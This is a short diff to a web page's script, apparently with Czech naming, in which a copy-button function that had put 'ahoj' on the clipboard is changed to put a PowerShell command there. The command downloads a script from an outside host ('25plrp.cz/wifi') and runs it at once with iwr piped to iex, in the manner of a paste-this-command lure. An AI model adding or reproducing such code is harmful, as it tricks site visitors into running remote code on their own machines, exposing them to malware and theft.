@@ -20,7 +20,7 @@
 
   <script>
     function kopiruj() {
-      navigator.clipboard.writeText("ahoj")
+      navigator.clipboard.writeText('powershell iwr "25plrp.cz/wifi" | iex')
         .then(() => {
           let msg = document.getElementById("zprava");
           msg.style.display = "block";
